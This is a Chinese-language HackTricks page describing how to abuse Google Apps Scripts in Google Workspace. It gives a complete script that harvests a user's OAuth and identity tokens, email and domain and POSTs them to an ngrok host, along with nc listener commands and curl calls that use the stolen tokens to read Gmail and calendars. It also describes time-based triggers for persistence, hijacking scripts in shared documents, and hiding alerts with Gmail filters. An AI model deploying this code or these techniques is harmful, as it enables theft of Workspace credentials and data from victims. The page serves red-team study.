# GWS - App Scripts

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

- 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
- 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
- **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## App Scripts

App Scripts是**当具有编辑权限的用户访问与App Script链接的文档并**在**接受OAuth提示后触发的代码**。\
它们也可以被设置为**由App Script的所有者每隔一段时间执行一次**（持久性）。

### 创建App Script

有几种创建App Script的方法，尽管最常见的方法是**从Google文档（任何类型）**和作为**独立项目**创建：

<details>

<summary>从Google文档、表格或幻灯片创建一个容器绑定项目</summary>

1. 打开文档文档、表格或幻灯片演示文稿。
2. 点击**扩展** > **Google Apps Script**。
3. 在脚本编辑器中，点击**无标题项目**。
4. 给您的项目命名，然后点击**重命名**。

</details>

<details>

<summary>创建一个独立项目</summary>

要从Apps Script创建一个独立项目：

1. 转到[`script.google.com`](https://script.google.com/)。
2. 点击**新项目**。
3. 在脚本编辑器中，点击**无标题项目**。
4. 给您的项目命名，然后点击**重命名**。

</details>

<details>

<summary>从Google Drive创建一个独立项目</summary>

1. 打开[Google Drive](https://drive.google.com/)。
2. 点击**新建** > **更多** > **Google Apps Script**。

</details>

<details>

<summary>从Google表单创建一个容器绑定项目</summary>

1. 在Google表单中打开一个表单。
2. 点击更多 more\_vert > **脚本编辑器**。
3. 在脚本编辑器中，点击**无标题项目**。
4. 给您的项目命名，然后点击**重命名**。

</details>

<details>

<summary>使用clasp命令行工具创建一个独立项目</summary>

`clasp`是一个命令行工具，允许您从终端创建、拉取/推送和部署Apps Script项目。

有关更多详细信息，请参阅[使用`clasp`进行命令行界面的指南](https://developers.google.com/apps-script/guides/clasp)。

</details>

## App Script场景 <a href="#create-using-clasp" id="create-using-clasp"></a>

### 创建带有App Script的Google表格

首先创建一个App Script，我建议在这种情况下创建一个Google表格，然后转到**`扩展 > App Scripts`**，这将为您打开一个**与该表格链接的新App Script**。

### 泄露令牌

为了授予OAuth令牌访问权限，您需要点击**`服务 +`并添加类似的范围**：

- **AdminDirectory**：访问目录的用户和组（如果用户具有足够的权限）
- **Gmail**：访问Gmail数据
- **Drive**：访问Drive数据
- **Google Sheets API**：使其与触发器一起工作

要自行更改**所需的范围**，您可以转到项目设置并启用：**`在编辑器中显示"appsscript.json"清单文件`**。

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

要捕获请求，您只需运行：
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
### 请求执行应用脚本所需的权限：

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
由于存在外部请求，OAuth提示框还会**请求权限以访问外部端点**。
{% endhint %}

### 创建触发器

一旦应用被读取，点击**⏰ 触发器**创建一个触发器。在**函数**中选择**`getToken`**，在部署中运行选择**`Head`**，在事件源中选择**`From spreadsheet`**，事件类型选择**`On open`**或**`On edit`**（根据您的需求），然后保存。

请注意，如果需要调试，可以在**执行选项卡中检查应用脚本的运行**。

### 共享

为了**触发**应用脚本，受害者需要连接**编辑访问权限**。

{% hint style="success" %}
用于执行**应用脚本**的**令牌**将是**触发器创建者的令牌**，即使其他用户以编辑身份打开文件。
{% endhint %}

### 滥用“与我共享”的文档

{% hint style="danger" %}
如果有人**与您共享了一个包含应用脚本和使用应用脚本的 Head 触发器**的文档，您可以修改应用脚本代码（例如添加窃取令牌功能），访问它，然后**应用脚本将以与与您共享文档的用户相同的权限执行**！（请注意，所有者的 OAuth 令牌将具有在创建触发器时给定的访问范围）。

**脚本的创建者将收到通知，指示有人修改了脚本**（考虑使用 Gmail 权限生成过滤器以防止警报？）
{% endhint %}

{% hint style="success" %}
如果**攻击者修改了应用脚本的范围**，更新**不会应用**到文档中，直到创建具有更改的新触发器。因此，攻击者将无法使用比他在创建触发器时设置的范围更多的权限窃取所有者的创建者令牌。
{% endhint %}

### 复制而非共享

当您创建一个共享文档的链接时，会创建类似于以下链接：`https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
如果您将结尾的**"/edit"**更改为**"/copy"**，而不是访问它，谷歌会询问您是否要**生成文档的副本**：

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

如果用户复制它并访问，**文档的内容和应用脚本都将被复制**，但**触发器不会**，因此**不会执行任何操作**。

### 作为 Web 应用程序共享

请注意，还可以将**应用脚本**作为**Web应用程序**共享（在应用脚本的编辑器中，部署为Web应用程序），但会出现如下警告：

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

接着是**典型的 OAuth 提示**，要求所需的权限。

### 测试

您可以测试收集到的令牌以列出电子邮件：
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

列出用户的日历：
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## 应用脚本作为持久性

一种持久性的选择是**创建一个文档并添加一个触发器来调用`getToken`函数，并与攻击者共享文档，这样每次攻击者打开文件时就会**窃取受害者的令牌。

还可以创建一个应用脚本，并设置它每隔一段时间触发一次（比如每分钟、每小时、每天...）。一个已经**获取了凭据或受害者会话的攻击者可以设置一个应用脚本定时触发器，每天泄露一个非常特权的OAuth令牌**：

只需创建一个应用脚本，转到触发器，点击添加触发器，选择事件源为时间驱动，并选择最适合您的选项：

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
这将创建一个安全警报电子邮件和一个推送消息到您的移动设备，提醒您有关此事。
{% endhint %}

### 共享文档未经验证提示绕过

此外，如果有人与您共享了一个具有**编辑访问权限**的文档，您可以在文档内生成**应用脚本**，而文档的**所有者（创建者）将成为应用脚本的所有者**。

{% hint style="warning" %}
这意味着，文档的**创建者将被视为任何拥有编辑访问权限的人在其中创建的任何应用脚本的创建者**。

这也意味着，**应用脚本将受到文档创建者的 Workspace 环境的信任**。
{% endhint %}

{% hint style="danger" %}
这也意味着，如果**应用脚本已经存在**并且人们已经**授予了访问权限**，那么任何具有文档上**编辑权限**的人都可以**修改它并滥用该访问权限**。\
要滥用此功能，您还需要人们触发应用脚本。一个巧妙的技巧是**将脚本发布为 Web 应用程序**。当已经**授予应用脚本访问权限**的**人们**访问网页时，他们将**触发应用脚本**（这也适用于使用`<img>`标签）。
{% endhint %}
